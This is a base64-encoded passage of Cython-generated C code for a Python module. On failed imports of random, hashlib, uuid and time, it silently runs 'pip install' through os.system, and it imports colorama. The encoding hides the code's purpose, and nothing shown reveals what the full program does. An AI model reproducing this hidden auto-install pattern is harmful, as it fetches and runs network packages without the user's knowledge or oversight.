B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzIsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDU0LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0w3Nl9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmFuZG9tfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBnb3RvIF9fcHl4X0w3NV9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0w3Nl9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDc1X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDc5X3RyeV9lbmQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDgyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDgyX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgZ290byBfX3B5eF9MODdfdHJ5X2VuZDsKICAgIF9fcHl4X0w4Ml9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDU4LCBfX3B5eF9MODRfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9oYXNobGlifTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGdvdG8gX19weXhfTDgzX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDg0X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MODNfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MODdfdHJ5X2VuZDo7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDkwX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oYXNobGliLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNjEsIF9fcHl4X0w5MF9lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIGdvdG8gX19weXhfTDk1X3RyeV9lbmQ7CiAgICBfX3B5eF9MOTBfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAKICAgICB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygibmUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8yLCAmX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDkyX2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNjMsIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNjMsIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBfX3B5eF90XzYgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdXVpZH07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDYzLCBfX3B5eF9MOTJfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBnb3RvIF9fcHl4X0w5MV9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDkxX2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDk1X3RyeV9lbmQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNjUsIF9fcHl4X0w5OF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDY1LCBfX3B5eF9MOThfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBnb3RvIF9fcHl4X0wxMDNfdHJ5X2VuZDsKICAgIF9fcHl4X0w5OF9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDY2LCBfX3B5eF9MMTAwX2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKCiAgICAgIAogICAgICBfX3B5eF90XzkgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdGltZX07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGdvdG8gX19weXhfTDk5X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDEwMF9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDk5X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpOwogICAgX19weXhfTDEwM190cnlfZW5kOjsKICB9CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Gb3JlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU3R5bGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDEwNl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JhbWEsIF9fcHl4X3RfNSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Gb3JlLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICB